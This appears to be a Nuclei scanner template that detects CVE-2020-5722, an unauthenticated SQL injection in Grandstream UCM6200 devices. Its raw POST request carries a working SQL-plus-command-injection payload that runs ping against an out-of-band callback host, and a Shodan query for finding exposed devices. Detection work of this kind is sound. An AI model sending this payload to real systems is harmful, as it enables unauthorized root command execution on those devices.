id: CVE-2020-5722

info:
  name: Grandstream UCM6200 - SQL Injection
  author: theamanrawat
  severity: critical
  description: |
    Grandstream UCM6200 series contains an unauthenticated remote SQL injection caused by crafted HTTP requests, letting attackers execute shell commands as root on versions before 1.0.19.20 or inject HTML in emails before 1.0.20.17.
  impact: |
    Attackers can execute root shell commands or inject malicious HTML, leading to full device compromise or phishing attacks.
  remediation: |
    Update to version 1.0.19.20 or later for root command execution fix, and version 1.0.20.17 or later for email injection fix.
  reference:
    - https://threatprotect.qualys.com/2020/04/01/grandstream-ucm62xx-remote-code-execution-vulnerability/
    - https://nvd.nist.gov/vuln/detail/CVE-2020-5722
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2020-5722
    epss-score: 0.90907
    epss-percentile: 0.99612
    cwe-id: CWE-89
  metadata:
    verified: false
    max-request: 1
    shodan-query: 'ssl:"Grandstream" "Set-Cookie: TRACKID"'
  tags: cve,cve2020,grandstream,sqli,rce,vuln,kev,vkev

http:
  - raw:
      - |
        POST /cgi? HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        Content-Length: 87

        action=sendPasswordEmail&user_name=admin'+or+1=1--`;`ping${IFS}{{interactsh-url}}`;`

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(header, "application/json")'
          - 'interactsh_protocol == "dns"'
        condition: and
# digest: 4a0a00473045022049be1de5fc159fdbc56744dbf7c3ef97f51c826a54cc2f89a8d78c9fcbd10f5a022100f0ad5717e6f0d8fa4c9051b3bc1a3a1578e0fb10847128a6f7f9496d7523df97:922c64590222798bb761d5b6d8e72950